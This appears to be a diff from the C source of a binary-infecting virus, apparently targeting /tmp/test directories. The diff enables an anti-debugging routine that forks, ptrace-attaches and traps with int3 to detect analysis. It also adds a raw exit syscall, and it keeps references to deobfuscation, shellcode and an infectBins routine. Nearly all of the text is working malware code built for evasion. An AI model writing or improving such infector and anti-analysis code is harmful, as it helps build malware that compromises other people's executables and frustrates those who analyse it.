@@ -6,14 +6,17 @@ static void  start(void) {}
 #include "shellcode.h"
 
 int   entry_point(void *magic) {
+  int     ret;
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
-  /* if (preventDebug() == -1) */
-  /*   return (stop(1, magic)); */
+  if ((ret = preventDebug()) == -1)
+    return (stop(1, magic));
+  if (ret == 1)
+    return (stop(0, magic));
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -21,7 +24,7 @@ int   entry_point(void *magic) {
     return (stop(1, magic));
   /* if (infectBins(infectDir2) == -1) */
   /*   return (stop(1, magic)); */
-  return (stop(0, magic));
+  exit(0);
 }
 
 static int   stop(int status, void *magic) {
@@ -38,6 +41,14 @@ static int   stop(int status, void *magic) {
       "mov $0, %rbp\n\t"
       "jmp endSC");
   return (status);
+}
+
+static void exit(int status) {
+  register int  rax asm("rax") = 60;
+  register int  rdi asm("rdi") = status;
+
+  asm("syscall"
+    : "=r" (rax));
 }
 
 static int  mprotect(void *addr, size_t len, int prot) {
@@ -405,8 +416,27 @@ static int  checkProcess(char *dirname) {
 }
 
 static int   preventDebug(void) {
-  if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
-    return (-1);
+  pid_t pid;
+
+  if ((pid = fork()) != 0) {
+    if (pid < 0)
+      return (-1);
+    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
+      kill(pid, 9);
+      return (-1);
+    }
+    if (waitpid(pid, 0, 0) < 0) {
+      kill(pid, 9);
+      return (-1);
+    }
+    ptrace(PTRACE_CONT, pid, 0, 0);
+    if (waitpid(pid, 0, 0) < 0) {
+      kill(pid, 9);
+      return (-1);
+    }
+    return (1);
+  } else
+    asm("int3");
   return (0);
 }
 
